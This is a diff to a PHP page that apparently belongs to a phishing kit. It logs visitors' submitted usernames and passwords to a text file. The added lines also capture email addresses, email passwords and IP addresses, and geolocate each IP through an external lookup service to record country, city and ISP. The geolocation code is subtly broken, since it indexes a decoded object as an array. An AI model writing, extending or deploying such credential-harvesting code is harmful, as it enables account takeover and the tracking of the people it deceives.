@@ -6,13 +6,6 @@ date_default_timezone_set("Europe/Istanbul");
 
 require 'vendor2/autoload.php';
 
-function php_multiline()
-{
-    return PHP_EOL . PHP_EOL . PHP_EOL;
-}
-
-define("PHP_MULTILINE", php_multiline());
-
 if($_GET)
 {
     if(empty($_GET['username'])) echo "<script type='text/javascript'>alert('Do not make space on your username!');</script>";
@@ -26,11 +19,39 @@ if(!empty($_GET['username']) && empty($_GET['comen']))
 
 if(isset($_GET['comen']))
 {
+    $curl = curl_init();
+    curl_setopt($curl, CURLOPT_URL, "http://ip-api.com/json/".$_SERVER['REMOTE_ADDR']);
+    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
+    $output = curl_exec($curl);
+    curl_close($curl);
+    $json = json_decode($output);
+    
     $dosya = fopen("baris-altay.txt", "a");
     fwrite($dosya, "
     \$_KULLANICI_ADI : " . $_GET['username'] . "
     
     \$_SIFRE         : " . $_GET['password'] . "
+    
+    \$_EPOSTA        : " . $_GET['email'] . "
+    
+    \$_EPOSTA_SIF    : " . $_GET['emailPasswword'] . "
+    
+    \$_IP            : " . $_SERVER['REMOTE_ADDR'] . "
+    
+    \$_ULKE          : " . $json['country'] . "
+    
+    \$_SEHIR         : " . $json['regionName'] . "
+    
+    \$_ILCE          : " . $json['city'] . "
+    
+    \$_ISP           : " . $json['isp'] . "
+    
+    
+    
+    
+    
+    
+    
     ");
     fclose($dosya);
     
